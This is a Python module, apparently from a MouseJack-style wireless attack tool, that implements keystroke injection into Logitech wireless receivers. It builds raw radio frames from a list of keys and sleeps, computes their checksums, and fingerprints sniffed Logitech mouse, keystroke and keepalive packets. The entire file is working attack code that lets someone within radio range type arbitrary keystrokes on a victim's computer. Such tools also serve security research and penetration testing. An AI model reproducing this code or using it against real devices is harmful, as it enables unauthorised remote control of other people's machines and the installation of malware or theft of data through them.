# -*- coding: utf-8 -*-


class HID(object):
    ''' Injection for Logitech devices '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Logitech'
        # Mouse frames use type 0xC2
        # Multmedia key frames use type 0xC3
        # To see why this works, read diagram 2.3.2 of:
        # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
        # (discovered by wiresharking usbmon)
        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]

    def checksum(self, payload):
        # This is also from the KeyKeriki paper
        # Thanks Thorsten and Max!
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

    def key(self, payload, key):
        payload[2] = key['mod']
        payload[3] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.checksum(self.key(self.payload_template[:], key))

    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(attack) - 1:
                next_key = attack[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([self.frame(), 0])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([self.keepalive[:], 10])

    @classmethod
    def fingerprint(cls, p):
        if len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return cls
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            # Definitely a logitech keystroke packet
            return cls
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return cls
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return cls
        return None

    @classmethod
    def description(cls):
        return 'Logitech HID'
